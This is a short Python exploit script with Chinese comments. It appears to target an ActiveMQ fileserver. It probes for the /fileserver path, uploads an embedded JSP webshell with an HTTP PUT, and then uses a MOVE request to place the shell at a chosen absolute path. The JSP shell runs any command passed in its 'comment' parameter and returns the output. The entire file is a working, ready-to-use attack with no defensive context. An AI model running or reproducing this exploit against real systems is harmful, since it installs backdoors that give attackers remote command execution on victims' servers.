#author:九世
#time:2019/1/18

import requests

shell_urls=[]
headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
one_url='/fileserver' #测试是否为默认路径/fileserver,可以自行更改
two_url='/fileserver/sq.txt' #shell的路径
'''默认马子'''
guanjianzi='RESTful file access'
data="""
<%@ page import="java.util.*,java.io.*"%> <% %> 
<HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION="">
<INPUT TYPE="text" NAME="comment"> 
<INPUT TYPE="submit" VALUE="Send"> 
</FORM> <pre> 
<%
 if ( request.getParameter( "comment" ) != null )
 {
	 out.println( "Command: " + request.getParameter( "comment" ) + "<BR>" );
	 Process p		= Runtime.getRuntime().exec( request.getParameter( "comment" ) );
	 OutputStream os	= p.getOutputStream();
	 InputStream in		= p.getInputStream();
	 DataInputStream dis	= new DataInputStream( in );
	 String disr		= dis.readLine();
	 while ( disr != null )
	 {
		 out.println( disr ); disr = dis.readLine();
	 }
 }
 %>
 </pre> 
 </BODY></HTML>
"""
def jiancha(url,path):
    paths=str(url).rstrip('/').strip()+one_url
    pathsq=str(url).rstrip('/').strip()+two_url
    rqt=requests.get(url=paths,headers=headers)
    if guanjianzi in rqt.text:
        print('[a] Found /fileserver path')
        try:
            rqts=requests.put(url=pathsq,headers=headers,data=data)
            if rqts.status_code==204:
                print('[a] Put webshell.txt is ok')
                print('[a] Webshell.txt path:{}'.format(rqts.url))
                shell_urls.append(rqts.url)
                headers_move = {'Destination':'file://{}'.format(path)} #绝对路径
                rqs = requests.request('MOVE',url=shell_urls[0],headers=headers_move)
                if rqs.status_code==204:
                    print('[a] statud_code is 204 get shell ok')
                    print('[h] Please Found you is webshell path')
            else:
                print('[q] Found /fileserver,but No start PUT request')
        except Exception as r:
            print('[q] Error:{}'.format(r))
    else:
        print('[q] Not Found /fileserver path')


